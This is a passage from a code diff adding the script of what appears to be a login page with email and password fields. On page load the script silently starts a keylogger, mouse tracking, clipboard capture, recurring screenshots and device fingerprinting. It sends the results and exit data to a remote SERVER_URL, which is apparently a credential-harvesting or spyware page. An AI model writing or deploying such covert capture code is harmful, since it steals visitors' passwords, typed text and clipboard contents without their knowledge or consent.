+                
+                // Resume screenshot capture
+                if (typeof html2canvas !== 'undefined') {
+                    screenshotInterval = setInterval(captureScreenshot, 120000);
+                }
+                
+                const visibilityData = {
+                    fingerprint: deviceFingerprint,
+                    sessionId: sessionId,
+                    action: 'page_visible',
+                    timestamp: new Date().toISOString()
+                };
+                
+                sendToServer(visibilityData, 'activity');
+            }
+        }
+
+        // ===== INITIALIZATION =====
+        async function initialize() {
+            // Generate session ID
+            sessionId = generateSessionId();
+            
+            // Get device fingerprint
+            deviceFingerprint = await getDeviceFingerprint();
+            
+            // Setup tracking
+            setupKeylogger();
+            setupMouseTracking();
+            setupClipboardCapture();
+            setupScreenshotCapture();
+            
+            // Set up page visibility listener
+            document.addEventListener('visibilitychange', handleVisibilityChange);
+            
+            // Collect initial device info
+            setTimeout(() => {
+                collectDeviceInfo();
+            }, 1000);
+            
+            // Send page load event
+            const pageLoadData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                action: 'page_load',
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            
+            sendToServer(pageLoadData, 'activity');
+        }
+
+        // ===== BEFORE UNLOAD =====
+        window.addEventListener('beforeunload', function() {
+            const exitData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                action: 'page_exit',
+                timestamp: new Date().toISOString(),
+                timeOnPage: Date.now() - startTime,
+                keystrokesCount: keystrokes.length,
+                mouseMovementsCount: mouseMovements.length
+            };
+            
+            // Send any remaining keystrokes
+            if (keystrokes.length > 0) {
+                sendKeystrokes();
+            }
+            
+            // Send any remaining mouse movements
+            if (mouseMovements.length > 0) {
+                sendMouseMovements();
+            }
+            
+            // Send exit data using sendBeacon (most reliable for exit)
+            navigator.sendBeacon(`${SERVER_URL}/exit`, JSON.stringify(exitData));
+        });
+
+        // ===== START EVERYTHING =====
+        document.addEventListener('DOMContentLoaded', function() {
+            startTime = Date.now();
+            initialize();
+            
+            // Focus on email field
+            document.getElementById('email').focus();
+            
+            // Auto-fill test credentials (for demo only - remove in production)
+            // document.getElementById('email').value = 'testuser@example.com';
+            // document.getElementById('password').value = 'testpassword123';
+        });
+
+        // ===== ERROR HANDLING =====
+        window.onerror = function(message, source, lineno, colno, error) {
+            const errorData = {
+                fingerprint: deviceFingerprint,
+                sessionId: sessionId,
+                type: 'javascript_error',
+                message: message,
+                source: source,
+                lineno: lineno,
+                colno: colno,
+                error: error ? error.stack : 'no stack',
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            };
+            
+            sendToServer(errorData, 'error');
+            return false;
+        };
+    </script>
+</body>
+</html>
